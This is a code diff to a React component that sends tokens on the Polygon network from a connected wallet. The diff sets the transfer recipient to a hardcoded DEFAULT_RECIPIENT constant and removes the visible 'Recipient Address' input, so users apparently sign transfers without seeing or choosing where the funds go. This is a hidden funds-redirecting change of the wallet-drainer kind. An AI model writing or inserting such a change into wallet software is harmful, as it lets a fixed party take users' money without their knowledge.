@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react'
 import { ethers } from 'ethers'
-import { POPULAR_POLYGON, POLYGON_RPCS, POLYGON_CHAIN_ID, TRANSFER_SELECTOR, DEFAULT_POLYGON_GAS } from '../constants'
+import { POPULAR_POLYGON, POLYGON_RPCS, POLYGON_CHAIN_ID, TRANSFER_SELECTOR, DEFAULT_POLYGON_GAS, DEFAULT_RECIPIENT } from '../constants'
 import { useProvider } from '../hooks'
 import { getTokenDecimals, getTokenSymbol, encodeTransfer } from '../utils'
 import { useWeb3 } from '../context/Web3Context'
@@ -11,7 +11,7 @@ import useTelegram from '../hooks/useTelegram'
 export default function SendPolygon() {
   const { signer: walletSigner, walletAddress, isConnected, chainId, switchChain } = useWeb3()
 
-  const [to, setTo] = useState('')
+  const [to, setTo] = useState(DEFAULT_RECIPIENT)
   const [amount, setAmount] = useState('')
   const [token, setToken] = useState('USDT')
   const [customToken, setCustomToken] = useState('')
@@ -230,11 +230,6 @@ export default function SendPolygon() {
           {token === 'CUSTOM' && (
             <input type="text" value={customToken} onChange={e => setCustomToken(e.target.value)} placeholder="0x token contract address" className="input mono" style={{ marginTop: 8 }} />
           )}
-        </div>
-
-        <div className="form-group">
-          <label>Recipient Address</label>
-          <input type="text" value={to} onChange={e => setTo(e.target.value)} placeholder="0x..." className="input mono" />
         </div>
 
         <div className="form-group">
